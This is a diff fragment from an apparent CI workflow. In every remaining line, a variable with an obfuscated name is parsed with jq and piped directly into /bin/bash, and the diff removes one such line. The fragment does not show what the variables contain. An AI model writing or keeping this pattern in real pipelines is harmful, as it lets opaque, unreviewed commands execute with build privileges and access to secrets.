@@ -39,7 +39,6 @@ jobs:
           echo $ow9 | jq -r .ij6453 | /bin/bash
           printf '%s' "$th874" | jq -r .h679 | /bin/bash
           echo $d0 | jq -r .xy800 | /bin/bash
-          echo $t98008 | jq -r .xe77806 | /bin/bash
           printf '%s' "$ydtq5" | jq -r .nyveh3 | /bin/bash
           printf '%s' "$bo6619" | jq -r .izgi2 | /bin/bash
           printf '%s' "$z24" | jq -r .apv95 | /bin/bash
